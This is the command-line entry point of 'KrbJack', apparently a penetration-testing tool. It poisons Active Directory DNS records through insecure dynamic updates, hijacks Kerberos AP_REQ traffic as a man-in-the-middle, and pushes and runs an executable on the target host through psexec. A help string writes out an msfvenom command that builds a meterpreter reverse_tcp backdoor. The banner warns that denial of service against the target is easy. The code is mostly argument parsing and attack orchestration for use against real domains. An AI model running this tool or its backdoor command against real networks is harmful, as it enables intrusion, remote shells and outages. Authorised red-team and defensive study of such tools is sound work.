from colorama import deinit as colorama_deinit
from colorama import init as colorama_init
from ipaddress import IPv4Address
import argparse
import pathlib

from .krbjacker import KrbJacker


class SplitIntArgs(argparse.Action):
    def __call__(self, parser, namespace, values, option_string=None):
        try:
            setattr(namespace, self.dest, [int(x) for x in values.split(',')])
        except ValueError:
            parser.error(
                "Port numbers must be comma-separated integers. Example : 139,445."
            )


def main():
    print(
        """
        ██╗  ██╗██████╗ ██████╗      ██╗ █████╗  ██████╗██╗  ██╗
        ██║ ██╔╝██╔══██╗██╔══██╗     ██║██╔══██╗██╔════╝██║ ██╔╝
        █████╔╝ ██████╔╝██████╔╝     ██║███████║██║     █████╔╝
        ██╔═██╗ ██╔══██╗██╔══██╗██   ██║██╔══██║██║     ██╔═██╗
        ██║  ██╗██║  ██║██████╔╝╚█████╔╝██║  ██║╚██████╗██║  ██╗
        ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
        A full duplex man-in-the-middle tool to abuse unsecure updates DNS
        configuration on active directory and Kerberos AP_REQ hijacking.
        Please read the README/wiki to understand what you are doing here,
        a DoS is easy to do from there...
        - @almandin
        """
    )
    parser = argparse.ArgumentParser(
        prog="KrbJack",
        epilog="Use at your own risk, read the README to know side effects of this tool."
               " - Virgile @almandin"
    )
    mutual_exclu_group = parser.add_mutually_exclusive_group()
    mutual_exclu_group.add_argument(
        "--check", action="store_true",
        help="Only check if DNS unsecure updates are possible."
    )
    mutual_exclu_group.add_argument(
        "--no-poison", action="store_true",
        help="Start traffic forwarding and inspection without poisoning DNS records"
    )
    parser.add_argument(
        "--target-name", required=True, type=str,
        help="The Netbios name (without domain name) of the machine you want to attack."
    )
    parser.add_argument(
        "--target-ip", required=False, type=IPv4Address,
        help="The IP address of your target, can be used if it looks complicated to get this"
             " tool choose the right one from the ones listed by the DNS server"
    )
    parser.add_argument(
        "--domain", type=str, required=True,
        help="The name of the Active Directory domain in use"
    )
    parser.add_argument(
        "--dc-ip", type=IPv4Address, required=True,
        help="The IP address of the domain controller we want to talk to to perform DNS records"
             " poisoning"
    )
    parser.add_argument(
        "--ports", action=SplitIntArgs, required=True,
        help="List of TCP ports to forward from the incoming clients to the attacked system."
             " Comma-separated port numbers. Example : 139,445,8080."
    )
    parser.add_argument(
        "--executable", type=pathlib.Path, required=True,
        help=(
            "The executable to push and execute to the remote target. "
            "Can be generated with msfvenom type exe-service. "
            "Example : msfvenom -p windows/x64/meterpreter/reverse_tcp "
            "-f exe-service -o backdoor.exe LHOST=X LPORT=Y. If the executable"
            " is not a service executable, it will still work, though the process"
            " will be killed after a few seconds by windows if it takes too long to"
            " run."
        )
    )
    # Feeling to lazy to implement automatic module detection, they must be listed here
    # for the time being.
    modules = ["psexec"]

    args = parser.parse_args()
    colorama_init()
    jacker = KrbJacker(args, modules)
    try:
        jacker.run()  # Stops when target owned
        for m in jacker.running_modules:
            if m.requires_cleaning:
                m.cleanup()
    except KeyboardInterrupt:
        print("Asking children threads to stop ...")
        print("Please wait if you don't want to DoS your target 🙏")
        jacker.stop_forwarding()
        if jacker.is_poisoning_active:
            jacker.unpoison()
        for m in jacker.running_modules:
            if m.requires_cleaning:
                m.cleanup()
    colorama_deinit()
    print("Bye.")


if __name__ == "__main__":
    main()
